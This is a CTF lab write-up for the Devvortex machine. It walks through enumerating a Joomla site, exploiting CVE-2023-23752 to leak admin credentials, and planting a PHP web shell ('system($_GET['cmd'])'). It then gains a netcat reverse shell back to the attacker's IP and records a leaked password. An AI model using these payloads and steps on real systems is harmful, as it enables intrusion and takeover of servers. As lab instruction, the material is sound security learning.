# Devvortex

![[attachments/Pasted image 20240331134929.png]]

**Difficulty**: Easy
**OS**: Linux
**Category**:

# Nmap scan:

![[attachments/Pasted image 20240331135136.png]]

```shell
nmap -sCV -A -p- -T4 --min-rate=1000 -oN scan 10.10.11.242
```

Edit `/etc/hosts` file. `sudo nano /etc/hosts`

![[attachments/Pasted image 20240331135505.png]]

Navigate to website:

![[attachments/Pasted image 20240331135544.png]]

Directory scan:

![[attachments/Pasted image 20240331144826.png]]

```shell
ffuf -u http://devvortex.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Nothing useful.

Further investigation of the site by checking page source, monitoring requests and responses gives no information.

Next is to perform sub domain enumeration, i tried using gobuster but no luck so i used wfuzz instead.


![[attachments/Pasted image 20240331145136.png]]

```shell
wfuzz -c -u http://devvortex.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.devvortex.htb" --hc 302
```
Found a sub domain of `dev`. Add it to `/etc/hosts` file.

![[attachments/Pasted image 20240331145252.png]]

Visit the sub domain.

![[attachments/Pasted image 20240331145436.png]]

Directory scan:

![[attachments/Pasted image 20240331145939.png]]

Found an administrator page.

![[attachments/Pasted image 20240331150458.png]]

Joomla admin login page.

Running a tool called `joomscan` we are only able to obtain the version.

![[attachments/Pasted image 20240331151833.png]]

Searching online led to discover an exploit `CVE-2023-23752` for the version

![[attachments/Pasted image 20240331151955.png]]

Using the exploit from github, follow the steps to install the requirements.

![[attachments/Pasted image 20240331152042.png]]

Then git clone the repository.

```shell
git clone https://github.com/Acceis/exploit-CVE-2023-23752.git
```

`cd` into the folder and run the exploit

```shell
ruby exploit.rb http://dev.devvortex.htb
```

![[attachments/Pasted image 20240331152212.png]]

We have 2 users and 1 password.

Login to the admin panel.

![[attachments/Pasted image 20240331152256.png]]

Now to find a way to gain a shell.

Navigating to this blog

![[attachments/Pasted image 20240331160008.png]]

[Link](https://vulncheck.com/blog/joomla-for-rce)

We have 2 ways to gain a shell, modifying a template or installing a malicious joomla plugin. 

![[attachments/Pasted image 20240331160048.png]]

I tried the steps in the blog by first inserting a web shell payload in index.php but it doesn't work and indicates i only have read access.
![[attachments/Pasted image 20240331160251.png]]


Tried the second method by uploading a webshell but it also doesn't work also.

![[attachments/Pasted image 20240331160504.png]]

Note: you can access the templates and extensions by going to the settings tab:

![[attachments/Pasted image 20240331160347.png]]

So what i did was to create a new file in templates named shell.php and insert my webshell payload there.

![[attachments/Pasted image 20240331160610.png]]

![[attachments/Pasted image 20240331160633.png]]

![[attachments/Pasted image 20240331160651.png]]

Payload:

```php
<?php system($_GET['cmd']); ?>
```

Save the file.

Access it by navigating to `http://dev.devvortex.htb/templates/cassiopeia/shell.php?cmd=id`

![[attachments/Pasted image 20240331160740.png]]

And we have command execution

![[attachments/Pasted image 20240331160810.png]]

Now to gain a reverse shell.

First check our current directory to know where the payload will be delivered to.

![[attachments/Pasted image 20240331164937.png]]

Next we upload a php reverse shell. I will be using [this](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Change IP to you VPN IP.
![[attachments/Pasted image 20240331165134.png]]

I will rename the file to something simpler like `revshell.php`

I will be transferring the file using netcat.

Host the file:

![[attachments/Pasted image 20240331165259.png]]

```shell
nc -lvnp PORT < file
```

Download the file.

![[attachments/Pasted image 20240331165346.png]]

```
nc IP PORT > file
```

File transferred:

![[attachments/Pasted image 20240331165429.png]]

Now to execute the payload.

Start a netcat listener on the port specified in the revshell payload.

![[attachments/Pasted image 20240331165555.png]]

Execute payload by navigating to the file.

![[attachments/Pasted image 20240331165622.png]]

And we have a shell:

![[attachments/Pasted image 20240331165822.png]]

What this means is that we never even needed to file get a web shell, we could have created the revshell payload from the admin panel. Here is the file now present in the admin panel.

![[attachments/Pasted image 20240331165840.png]]

Although nothing bad in learning how to get web shells.

Next up is to stabilize the shell

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z (background shell)
stty raw -echo;fg
Press ENTER
```


logan password `password123#`